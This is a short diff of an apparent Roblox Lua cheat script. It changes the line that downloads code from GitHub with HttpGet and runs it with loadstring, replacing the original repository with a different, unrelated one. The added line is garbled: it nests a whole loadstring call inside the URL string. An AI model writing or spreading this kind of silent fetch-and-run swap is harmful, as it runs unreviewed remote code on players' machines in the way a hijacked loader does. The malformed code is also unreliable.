@@ -16,4 +16,4 @@ if not game:IsLoaded() then repeat game.Loaded:Wait() until game:IsLoaded() end
             end
         until game.Players.LocalPlayer.Team ~= nil and game:IsLoaded()
     end
-    task.spawn(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/hermanos-dev/hermanos-script/main/middle.lua'))() end)
+    task.spawn(function() loadstring(game:HttpGet('loadstring(game:HttpGet("https://raw.githubusercontent.com/Fame5286/team.1/refs/heads/main/1"))() '))() end)
